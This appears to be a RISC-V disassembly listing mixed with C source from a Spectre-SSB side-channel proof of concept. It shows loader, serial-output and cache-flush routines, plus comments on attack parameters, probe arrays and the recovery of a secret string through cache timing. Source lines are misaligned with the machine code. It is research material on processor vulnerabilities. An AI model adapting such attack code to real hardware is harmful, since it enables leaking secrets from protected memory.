    18c4:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    18c8:	7ffff297          	auipc	t0,0x7ffff
    18cc:	a5828293          	addi	t0,t0,-1448 # 80000320 <__data_start+0x320>
    18d0:	0002a083          	lw	ra,0(t0)
    18d4:	0042a503          	lw	a0,4(t0)
    18d8:	0082a583          	lw	a1,8(t0)
    18dc:	7ffff517          	auipc	a0,0x7ffff
    18e0:	a6450513          	addi	a0,a0,-1436 # 80000340 <__data_start+0x340>
    18e4:	00050293          	mv	t0,a0
    18e8:	40002337          	lui	t1,0x40002
    18ec:	0002c503          	lbu	a0,0(t0)
    18f0:	00128293          	addi	t0,t0,1
    18f4:	00050663          	beqz	a0,1900 <trap_dump_registers+0x304>
    18f8:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4fa>
    18fc:	ff1ff06f          	j	18ec <trap_dump_registers+0x2f0>
    1900:	00438393          	addi	t2,t2,4
    1904:	cfc39ce3          	bne	t2,t3,15fc <trap_dump_registers>
    1908:	7ffff517          	auipc	a0,0x7ffff
    190c:	a4850513          	addi	a0,a0,-1464 # 80000350 <__data_start+0x350>
    1910:	00050293          	mv	t0,a0
    1914:	40002337          	lui	t1,0x40002
    1918:	0002c503          	lbu	a0,0(t0)
    191c:	00128293          	addi	t0,t0,1
    1920:	00050663          	beqz	a0,192c <abort>
    1924:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4fa>
    1928:	ff1ff06f          	j	1918 <trap_dump_registers+0x31c>

0000192c <abort>:
    192c:	ed8ff06f          	j	1004 <_end>
    1930:	00012003          	lw	zero,0(sp)
    1934:	00412083          	lw	ra,4(sp)
    1938:	00812103          	lw	sp,8(sp)
    193c:	00c12183          	lw	gp,12(sp)
    1940:	01012203          	lw	tp,16(sp)
    1944:	01412283          	lw	t0,20(sp)
    1948:	01812303          	lw	t1,24(sp)
    194c:	01c12383          	lw	t2,28(sp)
    1950:	02012403          	lw	s0,32(sp)
    1954:	02412483          	lw	s1,36(sp)
    1958:	02812503          	lw	a0,40(sp)
    195c:	02c12583          	lw	a1,44(sp)
    1960:	03012603          	lw	a2,48(sp)
    1964:	03412683          	lw	a3,52(sp)
    1968:	03812703          	lw	a4,56(sp)
    196c:	03c12783          	lw	a5,60(sp)
    1970:	04012803          	lw	a6,64(sp)
    1974:	04412883          	lw	a7,68(sp)
    1978:	04812903          	lw	s2,72(sp)
    197c:	04c12983          	lw	s3,76(sp)
    1980:	05012a03          	lw	s4,80(sp)
    1984:	05412a83          	lw	s5,84(sp)
    1988:	05812b03          	lw	s6,88(sp)
    198c:	05c12b83          	lw	s7,92(sp)
    1990:	06012c03          	lw	s8,96(sp)
    1994:	06412c83          	lw	s9,100(sp)
    1998:	06812d03          	lw	s10,104(sp)
    199c:	06c12d83          	lw	s11,108(sp)
    19a0:	07012e03          	lw	t3,112(sp)
    19a4:	07412e83          	lw	t4,116(sp)
    19a8:	07812f03          	lw	t5,120(sp)
    19ac:	07c12f83          	lw	t6,124(sp)
    19b0:	08010113          	addi	sp,sp,128
    19b4:	30200073          	mret
    19b8:	0000                	.insn	2, 0x
	...

000019bc <_rsd_memcpy>:
extern int __bss_start;
extern int __bss_end;

#define ram_start 0x80000000

static void* _rsd_memcpy(void* dest_, const void* src_, size_t n) {
    19bc:	fd010113          	addi	sp,sp,-48
    19c0:	02812623          	sw	s0,44(sp)
    19c4:	03010413          	addi	s0,sp,48
    19c8:	fca42e23          	sw	a0,-36(s0)
    19cc:	fcb42c23          	sw	a1,-40(s0)
    19d0:	fcc42a23          	sw	a2,-44(s0)
    uint8_t* dest = dest_;
    19d4:	fdc42783          	lw	a5,-36(s0)
    19d8:	fef42423          	sw	a5,-24(s0)
    const uint8_t* src = src_;
    19dc:	fd842783          	lw	a5,-40(s0)
    19e0:	fef42223          	sw	a5,-28(s0)

    for (size_t i = 0; i < n; i++) {
    19e4:	fe042623          	sw	zero,-20(s0)
    19e8:	0300006f          	j	1a18 <_rsd_memcpy+0x5c>
        dest[i] = src[i];
    19ec:	fe442703          	lw	a4,-28(s0)
    19f0:	fec42783          	lw	a5,-20(s0)
    19f4:	00f70733          	add	a4,a4,a5
    19f8:	fe842683          	lw	a3,-24(s0)
    19fc:	fec42783          	lw	a5,-20(s0)
    1a00:	00f687b3          	add	a5,a3,a5
    1a04:	00074703          	lbu	a4,0(a4)
    1a08:	00e78023          	sb	a4,0(a5)
    for (size_t i = 0; i < n; i++) {
    1a0c:	fec42783          	lw	a5,-20(s0)
    1a10:	00178793          	addi	a5,a5,1
    1a14:	fef42623          	sw	a5,-20(s0)
    1a18:	fec42703          	lw	a4,-20(s0)
    1a1c:	fd442783          	lw	a5,-44(s0)
    1a20:	fcf766e3          	bltu	a4,a5,19ec <_rsd_memcpy+0x30>
    }
    return dest;
    1a24:	fe842783          	lw	a5,-24(s0)
}
    1a28:	00078513          	mv	a0,a5
    1a2c:	02c12403          	lw	s0,44(sp)
    1a30:	03010113          	addi	sp,sp,48
    1a34:	00008067          	ret

00001a38 <_rsd_memset>:

static void* _rsd_memset(void* str_, int c, size_t n) {
    1a38:	fd010113          	addi	sp,sp,-48
    1a3c:	02812623          	sw	s0,44(sp)
    1a40:	03010413          	addi	s0,sp,48
    1a44:	fca42e23          	sw	a0,-36(s0)
    1a48:	fcb42c23          	sw	a1,-40(s0)
    1a4c:	fcc42a23          	sw	a2,-44(s0)
    uint8_t* str = str_;
    1a50:	fdc42783          	lw	a5,-36(s0)
    1a54:	fef42423          	sw	a5,-24(s0)
    for (size_t i = 0; i < n; i++) {
    1a58:	fe042623          	sw	zero,-20(s0)
    1a5c:	0280006f          	j	1a84 <_rsd_memset+0x4c>
        str[i] = (uint8_t)c;
    1a60:	fe842703          	lw	a4,-24(s0)
    1a64:	fec42783          	lw	a5,-20(s0)
    1a68:	00f707b3          	add	a5,a4,a5
    1a6c:	fd842703          	lw	a4,-40(s0)
    1a70:	0ff77713          	zext.b	a4,a4
    1a74:	00e78023          	sb	a4,0(a5)
    for (size_t i = 0; i < n; i++) {
    1a78:	fec42783          	lw	a5,-20(s0)
    1a7c:	00178793          	addi	a5,a5,1
    1a80:	fef42623          	sw	a5,-20(s0)
    1a84:	fec42703          	lw	a4,-20(s0)
    1a88:	fd442783          	lw	a5,-44(s0)
    1a8c:	fcf76ae3          	bltu	a4,a5,1a60 <_rsd_memset+0x28>
    }
    return str;
    1a90:	fe842783          	lw	a5,-24(s0)
}
    1a94:	00078513          	mv	a0,a5
    1a98:	02c12403          	lw	s0,44(sp)
    1a9c:	03010113          	addi	sp,sp,48
    1aa0:	00008067          	ret

00001aa4 <_load>:

void _load() {
    1aa4:	fe010113          	addi	sp,sp,-32
    1aa8:	00112e23          	sw	ra,28(sp)
    1aac:	00812c23          	sw	s0,24(sp)
    1ab0:	02010413          	addi	s0,sp,32
    // The core function of the RSD loader called at the very beggining of run time.
    // It copies data in .data and .sdata sections from ROM to RAM
    // and sets 0 in .bss and .sbss sections in RAM.
    size_t data_size = (size_t)&__data_end - (size_t)&__data_start;
    1ab4:	800007b7          	lui	a5,0x80000
    1ab8:	39c78713          	addi	a4,a5,924 # 8000039c <dummyMem>
    1abc:	800007b7          	lui	a5,0x80000
    1ac0:	00078793          	mv	a5,a5
    1ac4:	40f707b3          	sub	a5,a4,a5
    1ac8:	fef42623          	sw	a5,-20(s0)
    size_t bss_size = (size_t)&__bss_end - (size_t)&__bss_start;
    1acc:	800067b7          	lui	a5,0x80006
    1ad0:	4b078713          	addi	a4,a5,1200 # 800064b0 <__bss_end>
    1ad4:	800007b7          	lui	a5,0x80000
    1ad8:	39c78793          	addi	a5,a5,924 # 8000039c <dummyMem>
    1adc:	40f707b3          	sub	a5,a4,a5
    1ae0:	fef42423          	sw	a5,-24(s0)
    _rsd_memcpy((void*)ram_start, &__rodata_end, data_size);
    1ae4:	fec42603          	lw	a2,-20(s0)
    1ae8:	000037b7          	lui	a5,0x3
    1aec:	b0678593          	addi	a1,a5,-1274 # 2b06 <__rodata_end>
    1af0:	80000537          	lui	a0,0x80000
    1af4:	ec9ff0ef          	jal	19bc <_rsd_memcpy>
    _rsd_memset(&__bss_start, 0, bss_size);
    1af8:	fe842603          	lw	a2,-24(s0)
    1afc:	00000593          	li	a1,0
    1b00:	800007b7          	lui	a5,0x80000
    1b04:	39c78513          	addi	a0,a5,924 # 8000039c <dummyMem>
    1b08:	f31ff0ef          	jal	1a38 <_rsd_memset>
}
    1b0c:	00000013          	nop
    1b10:	01c12083          	lw	ra,28(sp)
    1b14:	01812403          	lw	s0,24(sp)
    1b18:	02010113          	addi	sp,sp,32
    1b1c:	00008067          	ret

00001b20 <memcpy>:
//#include <time.h> // For time(NULL)
#include "util_riscv.h"
#include "cache.h"

// Remind: Spectre SSB  will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.

    1b20:	fd010113          	addi	sp,sp,-48
    1b24:	02812623          	sw	s0,44(sp)
    1b28:	03010413          	addi	s0,sp,48
    1b2c:	fca42e23          	sw	a0,-36(s0)
    1b30:	fcb42c23          	sw	a1,-40(s0)
    1b34:	fcc42a23          	sw	a2,-44(s0)
/* >>>>>> Mostly used parameters for debugging are listed below. >>>>>> */
    1b38:	fdc42783          	lw	a5,-36(s0)
    1b3c:	fef42423          	sw	a5,-24(s0)
/*
    1b40:	fd842783          	lw	a5,-40(s0)
    1b44:	fef42223          	sw	a5,-28(s0)
 * 1. Variable and function names are in lower camel case, i.e. camelCase, or sneak case, i.e. sneak_case.
    1b48:	fe042623          	sw	zero,-20(s0)
    1b4c:	0300006f          	j	1b7c <memcpy+0x5c>
    1b50:	fe442703          	lw	a4,-28(s0)
    1b54:	fec42783          	lw	a5,-20(s0)
    1b58:	00f70733          	add	a4,a4,a5
    1b5c:	fe842683          	lw	a3,-24(s0)
    1b60:	fec42783          	lw	a5,-20(s0)
    1b64:	00f687b3          	add	a5,a3,a5
    1b68:	00074703          	lbu	a4,0(a4)
    1b6c:	00e78023          	sb	a4,0(a5)
    1b70:	fec42783          	lw	a5,-20(s0)
    1b74:	00178793          	addi	a5,a5,1
    1b78:	fef42623          	sw	a5,-20(s0)
    1b7c:	fec42703          	lw	a4,-20(s0)
    1b80:	fd442783          	lw	a5,-44(s0)
    1b84:	fcf766e3          	bltu	a4,a5,1b50 <memcpy+0x30>
 * 2. (at)input, (at)inout, etc may be used for preprocessors.
    1b88:	fe842783          	lw	a5,-24(s0)
 */
    1b8c:	00078513          	mv	a0,a5
    1b90:	02c12403          	lw	s0,44(sp)
    1b94:	03010113          	addi	sp,sp,48
    1b98:	00008067          	ret

00001b9c <serial_wait>:

/**
 * The following parameters vary with machines and are obtained from experiments,
    1b9c:	ff010113          	addi	sp,sp,-16
    1ba0:	00812623          	sw	s0,12(sp)
    1ba4:	01010413          	addi	s0,sp,16
 * using "control variates method" and "binary/half-interval/logarithmic search/".
 */
//#define TRAIN_TIMES 24 // (Spectre-SSB does not need training.) Times to train the predictor. There shall be an ideal value for each machine.
// Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
#define ATTACK_ROUNDS 9 // Effective when 3, 10, 20, etc. Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
// For most processors with simple MDP(Memory Dependence Prediction), theoretically 1 will be enough for a successful Spectre-SSB attack.
    1ba8:	00000013          	nop
    1bac:	00c12403          	lw	s0,12(sp)
    1bb0:	01010113          	addi	sp,sp,16
    1bb4:	00008067          	ret

00001bb8 <serial_out_dec>:
#define CACHE_HIT_THRESHOLD 45 // For 3 rounds 36-46. For 8 rounds 36-50. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
// To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.

    1bb8:	bd010113          	addi	sp,sp,-1072
    1bbc:	42112623          	sw	ra,1068(sp)
    1bc0:	42812423          	sw	s0,1064(sp)
    1bc4:	43010413          	addi	s0,sp,1072
    1bc8:	bca42e23          	sw	a0,-1060(s0)
/* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */
    1bcc:	400027b7          	lui	a5,0x40002
    1bd0:	fef42023          	sw	a5,-32(s0)

#define SECRET_STRING "RISCV"
#define SECRET_LENGTH 5

    1bd4:	fe042423          	sw	zero,-24(s0)
#define ARRAY_STRIDE L1_DCACHE_BLOCK_BYTES
    1bd8:	fe042223          	sw	zero,-28(s0)
/**
 * Reference from Lipp et al, 2018, Meltdown:
    1bdc:	bdc42783          	lw	a5,-1060(s0)
    1be0:	0007dc63          	bgez	a5,1bf8 <serial_out_dec+0x40>
 * Based on the value of data in this example, a different part of the cache is accessed when executing the memory access out of order.
 * As data is multiplied by L1_DCACHE_BLOCK_BYTES (found with getconf PAGE_SIZE, typically 4096), data accesses to probe array are scattered over the array
    1be4:	00100793          	li	a5,1
    1be8:	fef42223          	sw	a5,-28(s0)
 * with a distance of L1_DCACHE_BLOCK_BYTES Bytes (typically 4 KB, assuming an 1 B data type for probe array, e.g. uint8_t).
 * Thus, there is an injective mapping from the value of data to a memory page, i.e., different values for data never result in an access to the same page.
    1bec:	bdc42783          	lw	a5,-1060(s0)
    1bf0:	40f007b3          	neg	a5,a5
    1bf4:	bcf42e23          	sw	a5,-1060(s0)
 * Consequently, if a cache line of a page is cached, we know the value of data.
 * The spreading over pages eliminates false positives due to the prefetcher, as the prefetcher cannot access data across page boundaries.
 * This prevents the hardware prefetcher from loading adjacent memory locations into the cache as well.
 */
    1bf8:	bdc42703          	lw	a4,-1060(s0)
    1bfc:	00a00793          	li	a5,10
    1c00:	02f767b3          	rem	a5,a4,a5
    1c04:	03078713          	addi	a4,a5,48 # 40002030 <__rodata_end+0x3ffff52a>
    1c08:	fe842783          	lw	a5,-24(s0)
    1c0c:	00279793          	slli	a5,a5,0x2
    1c10:	ff078793          	addi	a5,a5,-16
    1c14:	008787b3          	add	a5,a5,s0
    1c18:	bee7a823          	sw	a4,-1040(a5)

    1c1c:	fe842783          	lw	a5,-24(s0)
    1c20:	00178793          	addi	a5,a5,1
    1c24:	fef42423          	sw	a5,-24(s0)
/**
    1c28:	bdc42703          	lw	a4,-1060(s0)
    1c2c:	00a00793          	li	a5,10
    1c30:	02f747b3          	div	a5,a4,a5
    1c34:	bcf42e23          	sw	a5,-1060(s0)
 * Assume the attacker knows following information in advance:
    1c38:	bdc42783          	lw	a5,-1060(s0)
    1c3c:	fa079ee3          	bnez	a5,1bf8 <serial_out_dec+0x40>
 * - Hardware specifications
 * - Control of an guideArray (address, contents, size) and an probeArray (contents, size)
    1c40:	fe442783          	lw	a5,-28(s0)
    1c44:	02078463          	beqz	a5,1c6c <serial_out_dec+0xb4>
 * - The start address of secretString (but no way to directly access contents of secretString)
    1c48:	fe842783          	lw	a5,-24(s0)
    1c4c:	00279793          	slli	a5,a5,0x2
    1c50:	ff078793          	addi	a5,a5,-16
    1c54:	008787b3          	add	a5,a5,s0
    1c58:	02d00713          	li	a4,45
    1c5c:	bee7a823          	sw	a4,-1040(a5)
 * - The character set of secretString and its size (such as extended ASCII which is 0~255, 8bit).
    1c60:	fe842783          	lw	a5,-24(s0)
    1c64:	00178793          	addi	a5,a5,1
    1c68:	fef42423          	sw	a5,-24(s0)
 */

/**
    1c6c:	fe842783          	lw	a5,-24(s0)
    1c70:	fff78793          	addi	a5,a5,-1
    1c74:	fef42623          	sw	a5,-20(s0)
    1c78:	0300006f          	j	1ca8 <serial_out_dec+0xf0>
 * Although there are no direct accesses to secretString, after being "trained" for a certain times,
    1c7c:	f21ff0ef          	jal	1b9c <serial_wait>
    1c80:	fec42783          	lw	a5,-20(s0)
    1c84:	00279793          	slli	a5,a5,0x2
    1c88:	ff078793          	addi	a5,a5,-16
    1c8c:	008787b3          	add	a5,a5,s0
    1c90:	bf07a703          	lw	a4,-1040(a5)
    1c94:	fe042783          	lw	a5,-32(s0)
    1c98:	00e7a023          	sw	a4,0(a5)
/**
    1c9c:	fec42783          	lw	a5,-20(s0)
    1ca0:	fff78793          	addi	a5,a5,-1
    1ca4:	fef42623          	sw	a5,-20(s0)
    1ca8:	fec42783          	lw	a5,-20(s0)
    1cac:	fc07d8e3          	bgez	a5,1c7c <serial_out_dec+0xc4>
 * vulnerable processors will "grow accustomed to" legitimate inputs (such as branch-not-taken) fed deliberately by the attacker, 
 * and mistakenly predict that succeeding illegitimate attempts wll also be true, fetching secretString into cache.
    1cb0:	00000013          	nop
    1cb4:	00000013          	nop
    1cb8:	42c12083          	lw	ra,1068(sp)
    1cbc:	42812403          	lw	s0,1064(sp)
    1cc0:	43010113          	addi	sp,sp,1072
    1cc4:	00008067          	ret

00001cc8 <serial_out_hex>:
 * The attacker can then exploit the shortened access time (because of cache) and apply cache SCAs methods,
 * to infer characters of secretString one by one, using brutal force (exhausting all 256 possibities of extended ASCII).
 */
    1cc8:	fb010113          	addi	sp,sp,-80
    1ccc:	04112623          	sw	ra,76(sp)
    1cd0:	04812423          	sw	s0,72(sp)
    1cd4:	05010413          	addi	s0,sp,80
    1cd8:	faa42e23          	sw	a0,-68(s0)

    1cdc:	400027b7          	lui	a5,0x40002
    1ce0:	fef42223          	sw	a5,-28(s0)
#define RESULT_ARRAY_SIZE 256
/**
 * In this example program, all secret characters are in extended ASCII codes (0~255, 8bit).
 * Ofc you may change it for others like Unicode, but that will complicate everything,
    1ce4:	fe042423          	sw	zero,-24(s0)
 * and will also introduce REALLY high performance requirements.
 */
    1ce8:	1980006f          	j	1e80 <serial_out_hex+0x1b8>

    1cec:	fbc42783          	lw	a5,-68(s0)
    1cf0:	00f7f793          	andi	a5,a5,15
    1cf4:	14078e63          	beqz	a5,1e50 <serial_out_hex+0x188>
#define ARRAY_SIZE_FACTOR RESULT_ARRAY_SIZE
    1cf8:	fbc42783          	lw	a5,-68(s0)
    1cfc:	00f7f713          	andi	a4,a5,15
    1d00:	00100793          	li	a5,1
    1d04:	14f70263          	beq	a4,a5,1e48 <serial_out_hex+0x180>
/**
    1d08:	fbc42783          	lw	a5,-68(s0)
    1d0c:	00f7f713          	andi	a4,a5,15
    1d10:	00200793          	li	a5,2
    1d14:	12f70663          	beq	a4,a5,1e40 <serial_out_hex+0x178>
 * The size of probeArray can not be smaller than the max element of guideArray.
    1d18:	fbc42783          	lw	a5,-68(s0)
    1d1c:	00f7f713          	andi	a4,a5,15
    1d20:	00300793          	li	a5,3
    1d24:	10f70a63          	beq	a4,a5,1e38 <serial_out_hex+0x170>
 * Also the size of guideArray can not be smaller than "size of the probeArray divided by ARRAY_STRIDE".
    1d28:	fbc42783          	lw	a5,-68(s0)
    1d2c:	00f7f713          	andi	a4,a5,15
    1d30:	00400793          	li	a5,4
    1d34:	0ef70e63          	beq	a4,a5,1e30 <serial_out_hex+0x168>
 * For simplicity they are set the same in this program using ARRAY_SIZE_FACTOR.
    1d38:	fbc42783          	lw	a5,-68(s0)
    1d3c:	00f7f713          	andi	a4,a5,15
    1d40:	00500793          	li	a5,5
    1d44:	0ef70263          	beq	a4,a5,1e28 <serial_out_hex+0x160>
 * (Basically there is no point in designating these parameters of guideArray separately.)
    1d48:	fbc42783          	lw	a5,-68(s0)
    1d4c:	00f7f713          	andi	a4,a5,15
    1d50:	00600793          	li	a5,6
    1d54:	0cf70663          	beq	a4,a5,1e20 <serial_out_hex+0x158>
 *
    1d58:	fbc42783          	lw	a5,-68(s0)
    1d5c:	00f7f713          	andi	a4,a5,15
    1d60:	00700793          	li	a5,7
    1d64:	0af70a63          	beq	a4,a5,1e18 <serial_out_hex+0x150>
 * At the same time, ARRAY_SIZE_FACTOR must be no smaller than RESULT_ARRAY_SIZE (which is further restricted by character set size),
    1d68:	fbc42783          	lw	a5,-68(s0)
    1d6c:	00f7f713          	andi	a4,a5,15
    1d70:	00800793          	li	a5,8
    1d74:	08f70e63          	beq	a4,a5,1e10 <serial_out_hex+0x148>
 * and be a power of 2, e. g. legal value 512, 1024, etc. and illegal value 384.
    1d78:	fbc42783          	lw	a5,-68(s0)
    1d7c:	00f7f713          	andi	a4,a5,15
    1d80:	00900793          	li	a5,9
    1d84:	08f70263          	beq	a4,a5,1e08 <serial_out_hex+0x140>
 * For simplicity it is to set equal to RESULT_ARRAY_SIZE and has been proved to be sufficient.
    1d88:	fbc42783          	lw	a5,-68(s0)
    1d8c:	00f7f713          	andi	a4,a5,15
    1d90:	00a00793          	li	a5,10
    1d94:	06f70663          	beq	a4,a5,1e00 <serial_out_hex+0x138>
 */
    1d98:	fbc42783          	lw	a5,-68(s0)
    1d9c:	00f7f713          	andi	a4,a5,15
    1da0:	00b00793          	li	a5,11
    1da4:	04f70a63          	beq	a4,a5,1df8 <serial_out_hex+0x130>

    1da8:	fbc42783          	lw	a5,-68(s0)
    1dac:	00f7f713          	andi	a4,a5,15
    1db0:	00c00793          	li	a5,12
    1db4:	02f70e63          	beq	a4,a5,1df0 <serial_out_hex+0x128>
// Memory address for displaying characters (in place of printf)
    1db8:	fbc42783          	lw	a5,-68(s0)
    1dbc:	00f7f713          	andi	a4,a5,15
    1dc0:	00d00793          	li	a5,13
    1dc4:	02f70263          	beq	a4,a5,1de8 <serial_out_hex+0x120>
volatile char* outputAddr = (char*)0x40002000;
    1dc8:	fbc42783          	lw	a5,-68(s0)
    1dcc:	00f7f713          	andi	a4,a5,15
    1dd0:	00e00793          	li	a5,14
    1dd4:	00f71663          	bne	a4,a5,1de0 <serial_out_hex+0x118>
    1dd8:	06500793          	li	a5,101
    1ddc:	0780006f          	j	1e54 <serial_out_hex+0x18c>
    1de0:	06600793          	li	a5,102
    1de4:	0700006f          	j	1e54 <serial_out_hex+0x18c>
// Memory address for displaying characters (in place of printf)
    1de8:	06400793          	li	a5,100
    1dec:	0680006f          	j	1e54 <serial_out_hex+0x18c>

    1df0:	06300793          	li	a5,99
    1df4:	0600006f          	j	1e54 <serial_out_hex+0x18c>
 */
    1df8:	06200793          	li	a5,98
    1dfc:	0580006f          	j	1e54 <serial_out_hex+0x18c>
 * For simplicity it is to set equal to RESULT_ARRAY_SIZE and has been proved to be sufficient.
    1e00:	06100793          	li	a5,97
    1e04:	0500006f          	j	1e54 <serial_out_hex+0x18c>
 * and be a power of 2, e. g. legal value 512, 1024, etc. and illegal value 384.
    1e08:	03900793          	li	a5,57
    1e0c:	0480006f          	j	1e54 <serial_out_hex+0x18c>
 * At the same time, ARRAY_SIZE_FACTOR must be no smaller than RESULT_ARRAY_SIZE (which is further restricted by character set size),
    1e10:	03800793          	li	a5,56
    1e14:	0400006f          	j	1e54 <serial_out_hex+0x18c>
 *
    1e18:	03700793          	li	a5,55
    1e1c:	0380006f          	j	1e54 <serial_out_hex+0x18c>
 * (Basically there is no point in designating these parameters of guideArray separately.)
    1e20:	03600793          	li	a5,54
    1e24:	0300006f          	j	1e54 <serial_out_hex+0x18c>
 * For simplicity they are set the same in this program using ARRAY_SIZE_FACTOR.
    1e28:	03500793          	li	a5,53
    1e2c:	0280006f          	j	1e54 <serial_out_hex+0x18c>
 * Also the size of guideArray can not be smaller than "size of the probeArray divided by ARRAY_STRIDE".
    1e30:	03400793          	li	a5,52
    1e34:	0200006f          	j	1e54 <serial_out_hex+0x18c>
 * The size of probeArray can not be smaller than the max element of guideArray.
    1e38:	03300793          	li	a5,51
    1e3c:	0180006f          	j	1e54 <serial_out_hex+0x18c>
/**
    1e40:	03200793          	li	a5,50
    1e44:	0100006f          	j	1e54 <serial_out_hex+0x18c>
#define ARRAY_SIZE_FACTOR RESULT_ARRAY_SIZE
    1e48:	03100793          	li	a5,49
    1e4c:	0080006f          	j	1e54 <serial_out_hex+0x18c>

    1e50:	03000793          	li	a5,48
    1e54:	fe842703          	lw	a4,-24(s0)
    1e58:	00271713          	slli	a4,a4,0x2
    1e5c:	ff070713          	addi	a4,a4,-16
    1e60:	00870733          	add	a4,a4,s0
    1e64:	fcf72a23          	sw	a5,-44(a4)

    1e68:	fe842783          	lw	a5,-24(s0)
    1e6c:	00178793          	addi	a5,a5,1 # 40002001 <__rodata_end+0x3ffff4fb>
    1e70:	fef42423          	sw	a5,-24(s0)
uint8_t guideArray[ARRAY_SIZE_FACTOR];
    1e74:	fbc42783          	lw	a5,-68(s0)
    1e78:	4047d793          	srai	a5,a5,0x4
    1e7c:	faf42e23          	sw	a5,-68(s0)
 */
    1e80:	fe842703          	lw	a4,-24(s0)
    1e84:	00700793          	li	a5,7
    1e88:	e6e7d2e3          	bge	a5,a4,1cec <serial_out_hex+0x24>
uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];

#include "gadget.h"
    1e8c:	fe842783          	lw	a5,-24(s0)
    1e90:	fff78793          	addi	a5,a5,-1
    1e94:	fef42623          	sw	a5,-20(s0)
    1e98:	0300006f          	j	1ec8 <serial_out_hex+0x200>

    1e9c:	d01ff0ef          	jal	1b9c <serial_wait>
    1ea0:	fec42783          	lw	a5,-20(s0)
    1ea4:	00279793          	slli	a5,a5,0x2
    1ea8:	ff078793          	addi	a5,a5,-16
    1eac:	008787b3          	add	a5,a5,s0
    1eb0:	fd47a703          	lw	a4,-44(a5)
    1eb4:	fe442783          	lw	a5,-28(s0)
    1eb8:	00e7a023          	sw	a4,0(a5)
#include "gadget.h"
    1ebc:	fec42783          	lw	a5,-20(s0)
    1ec0:	fff78793          	addi	a5,a5,-1
    1ec4:	fef42623          	sw	a5,-20(s0)
    1ec8:	fec42783          	lw	a5,-20(s0)
    1ecc:	fc07d8e3          	bgez	a5,1e9c <serial_out_hex+0x1d4>
uint32_t mixed_i;
uint32_t dummy;
    1ed0:	00000013          	nop
    1ed4:	00000013          	nop
    1ed8:	04c12083          	lw	ra,76(sp)
    1edc:	04812403          	lw	s0,72(sp)
    1ee0:	05010113          	addi	sp,sp,80
    1ee4:	00008067          	ret

00001ee8 <serial_out_char>:

// Get the highest and second highest hit values in results().
// Each index (from 0 to RESULT_ARRAY_SIZE-1) of results() represents a character,
    1ee8:	fd010113          	addi	sp,sp,-48
    1eec:	02112623          	sw	ra,44(sp)
    1ef0:	02812423          	sw	s0,40(sp)
    1ef4:	03010413          	addi	s0,sp,48
    1ef8:	00050793          	mv	a5,a0
    1efc:	fcf40fa3          	sb	a5,-33(s0)
// and its corresponding stored array value means cache hits.
    1f00:	400027b7          	lui	a5,0x40002
    1f04:	fef42623          	sw	a5,-20(s0)
static uint32_t results[RESULT_ARRAY_SIZE];
    1f08:	c95ff0ef          	jal	1b9c <serial_wait>
    1f0c:	fec42783          	lw	a5,-20(s0)
    1f10:	fdf44703          	lbu	a4,-33(s0)
    1f14:	00e78023          	sb	a4,0(a5) # 40002000 <__rodata_end+0x3ffff4fa>
uint8_t hitIdx[2];
    1f18:	00000013          	nop
    1f1c:	02c12083          	lw	ra,44(sp)
    1f20:	02812403          	lw	s0,40(sp)
    1f24:	03010113          	addi	sp,sp,48
    1f28:	00008067          	ret

00001f2c <flushCache>:
 * Clears any set that has the same set bits as the input address range.
 * Note: This does not work if you are trying to flush dummyMem out of the cache.
 * @param memAddr starting address to clear the cache
 * @param memSize size of the data to remove in bytes
 */
void flushCache(uint32_t memAddr, uint32_t memSize){
    1f2c:	fc010113          	addi	sp,sp,-64
    1f30:	02812e23          	sw	s0,60(sp)
    1f34:	04010413          	addi	s0,sp,64
    1f38:	fca42623          	sw	a0,-52(s0)
    1f3c:	fcb42423          	sw	a1,-56(s0)
    
    // Find out the quantity of blocks that need to be cleared.
    uint32_t numSetsClear = memSize >> L1_DCACHE_BLOCK_BITS; // This operation removes block bits and shifts set bits to the right.
    1f40:	fc842783          	lw	a5,-56(s0)
    1f44:	0037d793          	srli	a5,a5,0x3
    1f48:	fef42623          	sw	a5,-20(s0)
	//  Offset bits other than all 0s indicate that it is not the beginning block of a set, so additional clearing is required.
    if ((memSize & OFFSET_MASK) != 0){
    1f4c:	fc842783          	lw	a5,-56(s0)
    1f50:	0077f793          	andi	a5,a5,7
    1f54:	00078863          	beqz	a5,1f64 <flushCache+0x38>
        numSetsClear += 1;
    1f58:	fec42783          	lw	a5,-20(s0)
    1f5c:	00178793          	addi	a5,a5,1
    1f60:	fef42623          	sw	a5,-20(s0)
    }
	// Flush the entire cache with no rollover, which makes this flushCache function finish faster.
    if (numSetsClear > L1_DCACHE_SETS){
    1f64:	fec42703          	lw	a4,-20(s0)
    1f68:	10000793          	li	a5,256
    1f6c:	00e7f663          	bgeu	a5,a4,1f78 <flushCache+0x4c>
        numSetsClear = L1_DCACHE_SETS;
    1f70:	10000793          	li	a5,256
    1f74:	fef42623          	sw	a5,-20(s0)

    // This memory address alignedMem is the start of a contiguous set of memory that will fit inside the cache.
    // Thus it has the following properties:
    // 1. dummyMem <= alignedMem < dummyMem + sizeof(dummyMem) (since set bits and offset are cleared)
    // 2. alignedMem has set bits = 0 and offset = 0, only tag bits remain.
    uint32_t alignedMem = (((uint32_t)&dummyMem) + L1_DCACHE_CAPACITY_BYTES) & TAG_MASK;
    1f78:	800007b7          	lui	a5,0x80000
    1f7c:	39c78713          	addi	a4,a5,924 # 8000039c <dummyMem>
    1f80:	000017b7          	lui	a5,0x1
    1f84:	00f707b3          	add	a5,a4,a5
    1f88:	8007f793          	andi	a5,a5,-2048
    1f8c:	fef42023          	sw	a5,-32(s0)
	// "&" is the address-of operator. The type of the result is "pointer to the operand."

    for (uint32_t i = 0; i < numSetsClear; ++i){
    1f90:	fe042423          	sw	zero,-24(s0)
    1f94:	0780006f          	j	200c <flushCache+0xe0>
        // Combined with the for loop to move across the sets that you want to flush.
